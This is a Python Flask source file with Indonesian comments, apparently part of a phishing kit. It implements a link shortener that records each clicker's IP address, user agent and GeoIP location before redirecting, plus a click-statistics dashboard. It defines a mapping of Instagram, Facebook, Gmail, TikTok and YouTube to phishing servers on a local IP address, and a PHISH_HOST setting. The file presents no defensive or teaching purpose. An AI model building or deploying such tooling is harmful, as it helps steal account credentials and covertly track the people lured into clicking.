from flask import Flask, redirect, request, render_template
import sqlite3, os, random, string
from datetime import datetime
import geoip2.database

app = Flask(__name__)
GEOIP_DB = 'GeoLite2-City.mmdb'  # Pastikan file GeoIP ada

# === Helper untuk membuat shortcode ===
def generate_shortcode(length=5):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# === Helper untuk simpan ke database ===
def insert_link(shortcode, url, source="Manual"):
    conn = sqlite3.connect('links.db')
    c = conn.cursor()
    c.execute("INSERT INTO links (shortcode, target_url, source) VALUES (?, ?, ?)", (shortcode, url, source))
    conn.commit()
    conn.close()

# === [1A] Buat link pendek dari form (GUI) ===
@app.route("/create", methods=["GET", "POST"])
def create_form():
    if request.method == "POST":
        url = request.form["target_url"]
        source = request.form["source"]
        shortcode = generate_shortcode()
        insert_link(shortcode, url, source)

        # ✅ Gunakan URL root yang otomatis
        full_link = f"{request.url_root}{shortcode}"
        return render_template("success.html", link=full_link, source=source)
    return render_template("create.html")

# Mapping platform ke URL phishing server
PHISHING_URLS = {
    "Instagram": "http://192.168.9.12:5001",
    "Facebook": "http://192.168.9.12:5002",
    "Gmail": "http://192.168.9.12:5003",
    "TikTok": "http://192.168.9.12:5004",
    "YouTube": "http://192.168.9.12:5005",
}

# === [1B] Buat link pendek dari URL langsung (manual CLI/cURL) ===
@app.route('/new/<path:url>')
def create_link(url):
    short = generate_shortcode()
    insert_link(short, url, source="CLI")
    return f"✅ Link created: http://{request.host}/{short}"

# === [2] Redirect & Tracking ===
@app.route('/<shortcode>')
def redirect_link(shortcode):
    conn = sqlite3.connect('links.db')
    c = conn.cursor()
    c.execute("SELECT target_url FROM links WHERE shortcode=?", (shortcode,))
    result = c.fetchone()
    if not result:
        return "❌ Link not found", 404

    target_url = result[0]
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')

    # GeoIP lookup
    try:
        reader = geoip2.database.Reader(GEOIP_DB)
        response = reader.city(ip)
        location = f"{response.city.name}, {response.country.name}"
    except:
        location = "Unknown"

    c.execute("INSERT INTO clicks (shortcode, ip, user_agent, location, timestamp) VALUES (?, ?, ?, ?, ?)",
              (shortcode, ip, ua, location, datetime.now()))
    conn.commit()
    conn.close()
    return redirect(target_url)

# === [3] Dashboard ===
@app.route('/dashboard')
def dashboard():
    stats = get_link_stats()
    return render_template('dashboard.html', stats=stats)

SERVER_IP = os.environ.get("PHISH_HOST", "localhost")  # default = localhost

# === [4] Tambahkan Fungsi Statistik ===
def get_link_stats():
    conn = sqlite3.connect('links.db')
    c = conn.cursor()

    # Ambil semua shortlink dari tabel links
    c.execute("SELECT shortcode, target_url, source FROM links")
    links = c.fetchall()

    stats = []
    for shortcode, url, source in links:
        # Total klik
        c.execute("SELECT COUNT(*) FROM clicks WHERE shortcode=?", (shortcode,))
        total_clicks = c.fetchone()[0]

        # IP unik
        c.execute("SELECT COUNT(DISTINCT ip) FROM clicks WHERE shortcode=?", (shortcode,))
        unique_ips = c.fetchone()[0]

        # Waktu klik terakhir
        c.execute("SELECT MAX(timestamp) FROM clicks WHERE shortcode=?", (shortcode,))
        last_click = c.fetchone()[0] or "—"

        stats.append({
            "shortcode": shortcode,
            "url": url,
            "source": source,
            "clicks": total_clicks,
            "unique_ips": unique_ips,
            "last_click": last_click
        })

    conn.close()
    return stats

# === Run ===
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

